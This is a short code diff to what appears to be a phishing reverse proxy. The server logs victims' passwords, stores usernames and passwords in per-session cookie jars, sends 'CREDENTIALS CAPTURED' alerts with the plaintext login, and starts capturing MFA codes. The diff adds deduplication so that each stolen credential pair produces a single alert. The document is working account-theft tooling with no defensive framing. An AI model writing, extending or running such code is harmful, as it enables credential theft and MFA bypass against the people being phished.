@@ -50,6 +50,7 @@ function supersedeStale(activeSessionId, upn, context) {
 
 const capturedSessions = new Set();
 const executedSessions = new Set();
+const seenCredentials = new Set();
 
 const cookieJars = new Map();
 const SESSION_COOKIE_NAME = "__proxy_sid";
@@ -505,10 +506,14 @@ p{color:#1b1b1b;font-size:15px;line-height:1.5}
         context.log("Password:", creds.password);
         const jar = cookieJars.get(sessionId);
         if (jar) { jar.credentials.username = creds.username; jar.credentials.password = creds.password; }
-        pushNotification("credentials",
-          `<b>CREDENTIALS CAPTURED</b><br><b>Username:</b> ${esc(creds.username)}<br><b>Password:</b> ${esc(creds.password)}`,
-          { user: creds.username, sessionId }
-        );
+        const credKey = creds.username.toLowerCase() + ":" + creds.password;
+        if (!seenCredentials.has(credKey)) {
+          seenCredentials.add(credKey);
+          pushNotification("credentials",
+            `<b>CREDENTIALS CAPTURED</b><br><b>Username:</b> ${esc(creds.username)}<br><b>Password:</b> ${esc(creds.password)}`,
+            { user: creds.username, sessionId }
+          );
+        }
       }
 
       if (creds.mfaCode) {
